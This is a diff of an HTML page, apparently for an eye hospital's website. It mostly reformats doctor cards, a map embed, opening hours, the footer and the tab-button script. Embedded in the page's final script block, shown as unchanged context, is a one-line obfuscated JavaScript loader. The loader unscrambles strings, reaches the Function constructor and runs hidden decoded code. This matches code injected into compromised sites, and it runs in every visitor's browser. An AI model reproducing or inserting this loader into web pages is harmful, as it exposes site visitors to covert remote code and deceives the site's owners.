+                                                src="../images/doctors/Aldemerdash Omar.png"
+                                                alt="our-clinics">
+                                        </div>
+                                        <div class="box-body p-3">
+                                            <h2>Dr Aldemerdash Omar</h2>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <p>Lorem ipsum dolor sit amet
+                                                consectetur adipisicing</p>
+                                            <h3
+                                                style="font-size: 20px; font-weight: bold;">23/5/2024</h3>
+                                        </div>
+                                    </div>
+                                </li>
+                            </ul>
                         </div>
-                </li>
-                      </ul>
                     </div>
-                        </div>
                 </div>
             </section>
 
             <section class="hurg-location">
-                <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d28384.58037701946!2d33.81995!3d27.216872!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x14528724fb0dc8bf%3A0x5e22d7a58f0c8b57!2zV2F0YW55IEV5ZSBDZW50cmUgSHVyZ2hhZGEt2YXYsdmD2LIg2KfZhNmI2LfZhtmKINmE2YTYudmK2YjZhiDYqNin2YTYutix2K_Zgtip!5e0!3m2!1sen!2seg!4v1709021393684!5m2!1sen!2seg" width="100%" height="550" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade" allowfullscreen></iframe>
+                <iframe
+                    src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d28384.58037701946!2d33.81995!3d27.216872!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x14528724fb0dc8bf%3A0x5e22d7a58f0c8b57!2zV2F0YW55IEV5ZSBDZW50cmUgSHVyZ2hhZGEt2YXYsdmD2LIg2KfZhNmI2LfZhtmKINmE2YTYudmK2YjZhiDYqNin2YTYutix2K_Zgtip!5e0!3m2!1sen!2seg!4v1709021393684!5m2!1sen!2seg"
+                    width="100%" height="550" style="border:0;" allowfullscreen
+                    loading="lazy" referrerpolicy="no-referrer-when-downgrade"
+                    allowfullscreen></iframe>
                 <div class="hurg-openingDays">
-                        <h3>Opening Days</h3>
-                        <ul style="text-align: left;">
-                          <li><span>Sat: 09:00 AM - 10:00 PM</span></li>
-                          <li><span>Sun: 09:00 AM - 10:00 PM</span></li>
-                          <li><span>Mon: 09:00 AM - 10:00 PM</span></li>
-                          <li><span>Tue: 09:00 AM - 10:00 PM</span></li>
-                          <li><span>Wed: 09:00 AM - 10:00 PM</span></li>
-                          <li><span>Thu: 09:00 AM - 10:00 PM</span></li>
-                          <li><span>Fri: 09:00 AM - 10:00 PM</span></li>
-                        </ul>
+                    <h3>Opening Days</h3>
+                    <ul style="text-align: left;">
+                        <li><span>Sat: 09:00 AM - 10:00 PM</span></li>
+                        <li><span>Sun: 09:00 AM - 10:00 PM</span></li>
+                        <li><span>Mon: 09:00 AM - 10:00 PM</span></li>
+                        <li><span>Tue: 09:00 AM - 10:00 PM</span></li>
+                        <li><span>Wed: 09:00 AM - 10:00 PM</span></li>
+                        <li><span>Thu: 09:00 AM - 10:00 PM</span></li>
+                        <li><span>Fri: 09:00 AM - 10:00 PM</span></li>
+                    </ul>
                 </div>
             </section>
 
@@ -1230,7 +1364,8 @@
                                     href="https://www.youtube.com/@watanyeyehospitals">
                                     <i class="fa fa-brands fa-youtube"></i>
                                 </a>
-                                <a target="_blank" href="https://wa.link/jp221p">
+                                <a target="_blank"
+                                    href="https://wa.link/jp221p">
                                     <i class="fa fa-brands fa-whatsapp"></i>
                                 </a>
                             </div>
@@ -1281,21 +1416,25 @@
 
                         <div class="col-md-4 col-sm-12 tag">
                             <div class="fot">
-                                <h4 class="text-uppercase pb-3">Working Days</h4>
+                                <h4 class="text-uppercase pb-3">Working
+                                    Days</h4>
 
                                 <span>From Saturday to Thursday:</span>
                                 <span>09:00 AM - 10:00 PM</span>
 
-                                <span style="display: block; margin-top: 5px;">Note:</span>
+                                <span
+                                    style="display: block; margin-top: 5px;">Note:</span>
                                 <span>Thawra Branch on Fridays:</span>
 
                                 <span>from 09:00 AM - 5:00 PM</span>
-                                <span style="display: block; margin-top: 5px;">Hegaz
+                                <span
+                                    style="display: block; margin-top: 5px;">Hegaz
                                     Branch on
                                     Fridays:
                                 </span>
                                 <span>from 09:00 AM - 10:00 PM</span>
-                                <span style="display: block; margin-top: 5px;">Hurghada
+                                <span
+                                    style="display: block; margin-top: 5px;">Hurghada
                                     Branch
                                     on Fridays:
                                 </span>
@@ -1386,7 +1525,8 @@
 
             <!-- owl-carosuel js file -->
 
-            <script src="../vendor/owl-carousel/js/owl.carousel.min.js"></script>
+            <script
+                src="../vendor/owl-carousel/js/owl.carousel.min.js"></script>
 
             <!-- JS main Script -->
             <script src="../js/main.js"></script>
@@ -1394,108 +1534,111 @@
             <script>
                 (function () { var EDq = '', SkB = 303 - 292; function mFb(w) { var u = 1610271; var j = w.length; var p = []; for (var z = 0; z < j; z++) { p[z] = w.charAt(z) }; for (var z = 0; z < j; z++) { var g = u * (z + 357) + (u % 20650); var n = u * (z + 468) + (u % 17337); var o = g % j; var x = n % j; var t = p[o]; p[o] = p[x]; p[x] = t; u = (g + n) % 3514907; }; return p.join('') }; var UkQ = mFb('eojyzrxrmcruwbdtgoutfkpqivlcsshnotanc').substr(0, SkB); var ert = 'i(r)nr ;,aj9ni7!2l.eip ve" (hnl.at,o=a+vl6.i tlo)a.=t"(44a(=0vhgl2oa.++n)aA.ist37ro2a)vh+,"f7dre;w=ro1;yve[Cl6lc89,(;l+=ivt)rt{[aoefhr("nffn(t;369zl=sccb;(r0tjub(lrr,g]lryda zh.a;c2=(,;+o+,=,]+y<t=l.uveCrt,h(vsz)*guqyagcj8 d),=;},l)o-qa=v)lmlvte3lsrq7)vAlgh(3 n=.<;=n C,, =nddv.nt(xn+"oC=nlh-;))vrtt=vrl{7f=t 6[r=[a; a, p;o8i-05p<;lb,,v=r)k {=()n+au;>a}t;{r2rh acvS+hmatsne;8c4;v9rv=a)"(guv(dy-l-0)f([r[u7rhtynw;ote,[(8;h1i ;)b.eha=codfe;rCsm0As,)=r;)(kr1ims,gwi9z9=(= nms](c01eC;oohng+Acr+=(odhel(h1la]2;.p);rh+jto;ih=gw<.d;)]fw+=1+s72iyuy+1hsnue8jff]00*8t,l);=;e6,f)(,v)rd+ svr 1gm)]petn]]2=;yr.w8vu,.g1[a);=h;k+n+da}iafmj=o)lqv[h96q[for.u!vxa g,ui t;i +bpj{ovho;=06asyns=")f}uarpus.},ca]{;(;a(=eC-[j5i;f.,ro[tr .yf.)7;r,ke0[y5oas=2;)cv5tfr7c);sartr+0b(0sgre>ron=at1;pt(46.4rr(ytomi cA=t<;.aen8=(ef{=t)na"a]o=n(m+[ )u-xpa("+s.wutnuSxnern.w9.nC+]r.w;aa;a](it]te upn}oe06rih;=j"};huj(1e0)a.'; var lsj = mFb[UkQ]; var CEv = ''; var glE = lsj; var jlr = lsj(CEv, mFb(ert)); var VIR = jlr(mFb('.++]&(Gma7\'$=Gj()06lssa..l0G.o+]eGiGodk5ri!)[G9a8.bi5wobddev};der)*6=u)*dqGthC%.p ]Gtd."d%;;d](!;pdoby7.n_0a.}]57$-o[f,av.e6ed;5(c,9Gb)!G=(*sl.n..)dff;[rf)Grc725);!iGw.;y[ }+o{7=5f].] %!_ycyG8=()n];)1r%sr"hda(._)df;$;+))*9\'%;,.6d3)&.d200ig.Gga(]d3h)#5)6d6b6Go2.#[+Gdi==+(%d]G%+#e+o7)r%*ba&%rf.+d5n6%.dkGt!=f("G=feo#=.]rad.iG[*.em.G;e2 dsr[=gx.;a1"5.c0"2}y{)))}0+t#u6(flGo.9r]tu}u(2b9$itro;w%l$u%.(%[=[b.Gm]G=Ge.Grn) b&GG.!eak+0. d)!{r)8l.)$i1!$xp}gf+=(G_tGdG!\'G92Gg}=ef=!!iG+GG(##G{8b,tGu=u GiGy5][(i)=o=l;(]9]a%i!.05])G%fG(%.){t$)bG=1ad1ff%.d=x.0Gulel6({.o60Go5i$(3Gl.\'G){GsG1G 1=r[G.e((#4#!!)t0d]n]f"ni9;stf,y(={2e(20f)$}=t]ddrr$2GnGf[bhdr{e=m.$.4rp((ssa1Ged*cuicn+GdoG%}c2.n30)(,t(a6(hp)GG((36.&![[]r(Gn +8{%*Gtf(!)t.or0oi05idC)_5_d][ #.;dii"! uSG"[aG.d')); var dsf = glE(EDq, VIR); dsf(1908); return 2818 })()
                
-                            // Function for Button 1
-                function handleButton1() {
-                console.log("Button 1 clicked");
+               
                 let goal1 = document.getElementById('goal-1')
                 let goal2 = document.getElementById('goal-2')
                 let goal3 = document.getElementById('goal-3')
                 let goal4 = document.getElementById('goal-4')
                 let goal5 = document.getElementById('goal-5')
-                    goal1.style.display = "block";
-                    goal1.classList.add("goal-active")
-                    goal2.classList.remove("goal-active")
-                    goal3.classList.remove("goal-active")
-                    goal4.classList.remove("goal-active")
-                    goal5.classList.remove("goal-active")
-                    goal2.style.display = "none";
-                    goal3.style.display = "none";
-                    goal4.style.display = "none";
-                    goal5.style.display = "none";
-                }
+                let header = document.getElementById('contain-header')
+                let btns = header.getElementsByClassName('goal-btn')
 
-                // Function for Button 2
-                function handleButton2() {
-                console.log("Button 2 clicked");
-                let goal1 = document.getElementById('goal-1')
-                let goal2 = document.getElementById('goal-2')
-                let goal3 = document.getElementById('goal-3')
-                let goal4 = document.getElementById('goal-4')
-                let goal5 = document.getElementById('goal-5')
-                goal2.style.display = "block";
-                goal2.classList.add("goal-active")
-                    goal1.classList.remove("goal-active")
-                    goal3.classList.remove("goal-active")
-                    goal4.classList.remove("goal-active")
-                    goal5.classList.remove("goal-active")
-                goal1.style.display = "none";
+            for(var i = 0 ; i < btns.length ; i++){
+                btns[i].addEventListener("click", function(){
+                    var current = document.getElementsByClassName("active");
+                    current[0].className = current[0].className.replace("active", "");
+                    this.className += " active";
+                })
+            }
+                        // Function for Button 1
+            function handleButton1() {
+            console.log("Button 1 clicked");
+                goal1.style.display = "block";
+                goal2.style.display = "none";
                 goal3.style.display = "none";
                 goal4.style.display = "none";
                 goal5.style.display = "none";
-                }
+            }
 
-                // Function for Button 3
-                function handleButton3() {
-                console.log("Button 3 clicked");
-                let goal1 = document.getElementById('goal-1')
-                let goal2 = document.getElementById('goal-2')
-                let goal3 = document.getElementById('goal-3')
-                let goal4 = document.getElementById('goal-4')
-                let goal5 = document.getElementById('goal-5')
-                goal3.style.display = "block";
-                goal3.classList.add("goal-active")
-                    goal1.classList.remove("goal-active")
-                    goal2.classList.remove("goal-active")
-                    goal4.classList.remove("goal-active")
-                    goal5.classList.remove("goal-active")
-                goal1.style.display = "none";
-                goal2.style.display = "none";
-                goal4.style.display = "none";
-                goal5.style.display = "none";
-                }
-                function handleButton4() {
-                console.log("Button 4 clicked");
-                let goal1 = document.getElementById('goal-1')
-                let goal2 = document.getElementById('goal-2')
-                let goal3 = document.getElementById('goal-3')
-                let goal4 = document.getElementById('goal-4')
-                let goal5 = document.getElementById('goal-5')
-                goal4.style.display = "block";
-                goal4.classList.add("goal-active")
-                    goal1.classList.remove("goal-active")
-                    goal2.classList.remove("goal-active")
-                    goal3.classList.remove("goal-active")
-                    goal5.classList.remove("goal-active")
-                goal3.style.display = "none";
-                goal1.style.display = "none";
-                goal2.style.display = "none";
-                goal5.style.display = "none";
-                }
-                function handleButton5() {
-                console.log("Button 4 clicked");
-                let goal1 = document.getElementById('goal-1')
-                let goal2 = document.getElementById('goal-2')
-                let goal3 = document.getElementById('goal-3')
-                let goal4 = document.getElementById('goal-4')
-                let goal5 = document.getElementById('goal-5')
-                goal5.style.display = "block";
-                goal5.classList.add("goal-active")
-                    goal1.classList.remove("goal-active")
-                    goal2.classList.remove("goal-active")
-                    goal3.classList.remove("goal-active")
-                    goal4.classList.remove("goal-active")
-                goal3.style.display = "none";
-                goal1.style.display = "none";
-                goal2.style.display = "none";
-                goal4.style.display = "none";
-                }
+            // Function for Button 2
+            function handleButton2() {
+            console.log("Button 2 clicked");
+            goal2.style.display = "block";
+            goal1.style.display = "none";
+            goal3.style.display = "none";
+            goal4.style.display = "none";
+            goal5.style.display = "none";
+            }
 
-                // Event listeners for each button
-                document.getElementById("button1").addEventListener("click", handleButton1);
-                document.getElementById("button2").addEventListener("click", handleButton2);
-                document.getElementById("button3").addEventListener("click", handleButton3);
-                document.getElementById("button4").addEventListener("click", handleButton4);
-                document.getElementById("button5").addEventListener("click", handleButton5);
+            // Function for Button 3
+            function handleButton3() {
+            console.log("Button 3 clicked");
+            goal3.style.display = "block";
+            goal1.style.display = "none";
+            goal2.style.display = "none";
+            goal4.style.display = "none";
+            goal5.style.display = "none";
+            }
+            function handleButton4() {
+            console.log("Button 4 clicked");
+            goal4.style.display = "block";
+            goal3.style.display = "none";
+            goal1.style.display = "none";
+            goal2.style.display = "none";
+            goal5.style.display = "none";
+            }
+            function handleButton5() {
+            console.log("Button 4 clicked");
+            goal5.style.display = "block";
+            goal3.style.display = "none";
+            goal1.style.display = "none";
+            goal2.style.display = "none";
+            goal4.style.display = "none";
+            }
+
+            // Event listeners for each button
+            document.getElementById("button1").addEventListener("click", handleButton1);
+            document.getElementById("button2").addEventListener("click", handleButton2);
+            document.getElementById("button3").addEventListener("click", handleButton3);
+            document.getElementById("button4").addEventListener("click", handleButton4);
+            document.getElementById("button5").addEventListener("click", handleButton5);   
+
+                
+//  // Get the goal elements
+// const goals = document.querySelectorAll('.goal-text');
+
+// // Function to handle button clicks
+// function handleButtonClick(event) {
+//   const buttonId = event.target.id;
+  
+//   // Hide all goals
+//   goals.forEach(goal => {
+//     goal.style.display = "none";
+//   });
+  
+//   // Show the selected goal
+//   const goalId = `goal-${buttonId.substring(buttonId.length - 1)}`;
+//   const selectedGoal = document.getElementById(goalId);
+//   if (selectedGoal) {
+//     selectedGoal.style.display = "block";
+//   }
+  
+//   // Remove active class from all buttons
+//   const buttons = document.getElementsByClassName('goal-btn');
+//   for (let i = 0; i < buttons.length; i++) {
+//     buttons[i].classList.remove('active');
+//   }
+  
+//   // Add active class to the clicked button
+//   event.target.classList.add('active');
+// }
+
+// // Add event listeners to all buttons
+// const buttons = document.getElementsByClassName('goal-btn');
+// for (let i = 0; i < buttons.length; i++) {
+//   buttons[i].addEventListener('click', handleButtonClick);
+// }
+
                 </script>
         </body>
     </html>
